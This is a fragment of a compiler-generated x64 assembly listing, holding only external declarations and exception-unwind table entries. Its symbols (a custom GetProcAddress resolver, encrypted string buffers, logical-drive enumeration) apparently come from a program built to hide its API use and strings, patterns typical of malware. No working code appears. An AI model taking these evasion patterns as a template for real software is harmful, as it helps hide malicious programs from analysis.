EXTRN	?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z:PROC	; getapi::GetProcAddressEx2
EXTRN	?m_malloc@@YAPEAX_K@Z:PROC			; m_malloc
EXTRN	?Write@logs@@YAXPEB_WZZ:PROC			; logs::Write
EXTRN	_CxxThrowException:PROC
EXTRN	_RTC_CheckStackVars:PROC
EXTRN	_RTC_InitBase:PROC
EXTRN	_RTC_Shutdown:PROC
EXTRN	__CheckForDebuggerJustMyCode:PROC
EXTRN	__GSHandlerCheck:PROC
EXTRN	__security_check_cookie:PROC
EXTRN	??_7type_info@@6B@:BYTE				; type_info::`vftable'
EXTRN	__security_cookie:QWORD
;	COMDAT pdata
pdata	SEGMENT
$pdata$??2@YAPEAX_KPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$??2@YAPEAX_KPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max@?$numeric_limits@_J@std@@SA_JXZ DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$?max@?$numeric_limits@_J@std@@SA_JXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@QEBDH@Z DD imagerel $LN3
	DD	imagerel $LN3+116
	DD	imagerel $unwind$??0exception@std@@QEAA@QEBDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+123
	DD	imagerel $unwind$??0exception@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1exception@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??1exception@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?what@exception@std@@UEBAPEBDXZ DD imagerel $LN5
	DD	imagerel $LN5+96
	DD	imagerel $unwind$?what@exception@std@@UEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gexception@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gexception@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@AEAA@QEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+95
	DD	imagerel $unwind$??0bad_alloc@std@@AEAA@QEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_alloc@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_alloc@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_alloc@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+84
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_array_new_length@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_array_new_length@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Throw_bad_array_new_length@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?_Throw_bad_array_new_length@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD imagerel $LN11
	DD	imagerel $LN11+181
	DD	imagerel $unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Orphan_all@_Container_base0@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Orphan_all@_Container_base0@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlen_string@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$?_Xlen_string@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$allocator@_W@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??0?$allocator@_W@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+93
	DD	imagerel $unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ DD imagerel $LN4
	DD	imagerel $LN4+94
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD imagerel $LN4
	DD	imagerel $LN4+94
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD imagerel $LN5
	DD	imagerel $LN5+84
	DD	imagerel $unwind$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+71
	DD	imagerel $unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+82
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+83
	DD	imagerel $unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+144
	DD	imagerel $unwind$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+65
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN4
	DD	imagerel $LN4+232
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+88
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+226
	DD	imagerel $unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD imagerel $LN5
	DD	imagerel $LN5+271
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+84
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0drive_info_@filesystem@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$??0drive_info_@filesystem@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z DD imagerel $LN19
	DD	imagerel $LN19+652
	DD	imagerel $unwind$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrlenW@@YAHPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?plstrlenW@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetLogicalDriveStringsW@@YAKKPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+89
	DD	imagerel $unwind$?pGetLogicalDriveStringsW@@YAKKPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?positive_modulo@@YAHHH@Z DD imagerel $LN3
	DD	imagerel $LN3+74
	DD	imagerel $unwind$?positive_modulo@@YAHHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1592
	DD	imagerel $unwind$??0?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+332
	DD	imagerel $unwind$??0?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Convert_size@_K_K@std@@YA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$_Convert_size@_K_K@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD imagerel $LN3
	DD	imagerel $LN3+124
	DD	imagerel $unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD imagerel $LN6
	DD	imagerel $LN6+390
	DD	imagerel $unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$max@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD imagerel $LN4
	DD	imagerel $LN4+97
	DD	imagerel $unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+119
	DD	imagerel $unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+98
	DD	imagerel $unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$min@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD imagerel $LN5
	DD	imagerel $LN5+94
	DD	imagerel $unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD imagerel $LN4
	DD	imagerel $LN4+93
	DD	imagerel $unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD imagerel $LN12
	DD	imagerel $LN12+154
	DD	imagerel $unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT rtc$TMZ
rtc$TMZ	SEGMENT
